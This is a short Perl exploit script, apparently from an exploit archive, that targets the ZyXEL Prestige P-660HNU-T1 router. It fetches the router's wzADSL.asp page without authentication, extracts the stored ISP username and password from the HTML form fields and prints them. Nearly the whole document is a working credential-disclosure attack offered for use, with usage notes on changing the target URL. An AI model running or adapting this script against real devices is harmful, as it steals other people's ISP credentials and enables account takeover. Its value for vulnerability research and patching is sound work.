#!/usr/bin/perl
# Exploit Author: SebastiáMagof
# Hardware: ZyXEL Prestig P-660HNU-T1
# Vulnerable file: wzADSL.asp
# location: http://gateway/cgi-bin/wzADSL.asp
# Bug: ISP usr+pwd disclosure
# Type: Local
# Date: 22/09/2014
# Vendor Homepage: http://www.zyxel.com/
# Version: 2.00(AAIJ.1)
# Tested on: Linux Fedora 20/Windows 7
# (\/)
# (**) Alpha (:
#(")(")
#usage:perl exploit.pl
use LWP::UserAgent;
use HTTP::Request;
#begin
print "\n\n************************************************************\n";
print "* ZyXEL Prestig MODELO P-660HNU-T1v2 local ISP usr+pwd     *\n";#default gateway www.example.com (Arnet Telecom ISP Argentina)
print "************************************************************\n\n";#in oher country modify $url line 25
 
  
#isp pwd disclosure file
my $url = "http://www.example.com/cgi-bin/wzADSL.asp";
   
  
#UserAgent
my $ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0");
   
  
#Request.
my $req = HTTP::Request->new(GET => $url);
my $request = $ua->request($req);
my $content = $request->content(); #content
my ($usr) = $content =~ m/name="wan_UserName" size="30" maxlength="128" value="(.+)" >/;
my ($pwd) = $content =~ m/name="wan_Password" size="30" maxlength="128" value="(.+)">/;
#ISP usr+pwd Arnet Telecom Argentina;
print "User: $usr\n";
print "Password: $pwd\n\n";
exit(0);
